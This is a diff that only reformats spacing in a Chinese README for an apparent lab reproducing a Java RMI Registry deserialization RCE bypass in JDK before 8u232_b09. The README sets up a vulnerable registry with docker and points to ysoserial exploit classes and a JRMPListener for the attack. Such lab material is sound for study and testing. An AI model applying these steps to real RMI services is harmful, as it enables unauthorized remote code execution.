@@ -1,8 +1,8 @@
 # Java < JDK8u232_b09 RMI Registry 反序列化远程代码执行绕过
 
-Java Remote Method Invocation（RMI）是Java中用于远程过程调用的机制。尽管远程绑定通常是被禁用的，但RMI Registry中包含一个可被利用的远程绑定功能。攻击者可以在绑定过程中，通过伪造序列化数据（实现Remote接口或动态代理实现了Remote接口的对象），使Registry在对数据进行反序列化时触发相应的利用链。
+Java Remote Method Invocation（RMI）是 Java 中用于远程过程调用的机制。尽管远程绑定通常是被禁用的，但 RMI Registry 中包含一个可被利用的远程绑定功能。攻击者可以在绑定过程中，通过伪造序列化数据（实现 Remote 接口或动态代理实现了 Remote 接口的对象），使 Registry 在对数据进行反序列化时触发相应的利用链。
 
-自JDK 8u121起，Registry对反序列化的类实施了白名单限制：
+自 JDK 8u121 起，Registry 对反序列化的类实施了白名单限制：
 
 ```java
 if (String.class == clazz
@@ -20,7 +20,7 @@ if (String.class == clazz
 }
 ```
 
-我们需要在这些白名单类中找到可利用的类。详细原理请参考[浅谈RMI Registry反序列化问题](https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/)。
+我们需要在这些白名单类中找到可利用的类。详细原理请参考 [浅谈 RMI Registry 反序列化问题](https://blog.0kami.cn/blog/2020/rmi-registry-security-problem-20200206/)。
 
 参考链接：
 
@@ -29,20 +29,20 @@ if (String.class == clazz
 
 ## 环境搭建
 
-执行如下命令编译及启动RMI Registry和服务器：
+执行如下命令编译及启动 RMI Registry 和服务器：
 
 ```
 docker compose build
 docker compose run -e RMIIP=your-ip -p 1099:1099 rmi
 ```
 
-将`your-ip`替换为你的服务器IP地址，客户端将使用此IP连接服务器。
+将 `your-ip` 替换为你的服务器 IP 地址，客户端将使用此 IP 连接服务器。
 
-环境启动后，RMI Registry将监听在1099端口。
+环境启动后，RMI Registry 将监听在 1099 端口。
 
 ## 漏洞复现
 
-使用[ysoserial](https://github.com/wh1t3p1g/ysoserial)的exploit包中的RMIRegistryExploit2或RMIRegistryExploit3进行攻击：
+使用 [ysoserial](https://github.com/wh1t3p1g/ysoserial) 的 exploit 包中的 RMIRegistryExploit2 或 RMIRegistryExploit3 进行攻击：
 
 ```bash
 # 启动JRMPListener
@@ -53,4 +53,4 @@ java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryEx
 
 ![](1.png)
 
-Registry会返回报错，这是正常现象，命令仍会成功执行。
+Registry 会返回报错，这是正常现象，命令仍会成功执行。
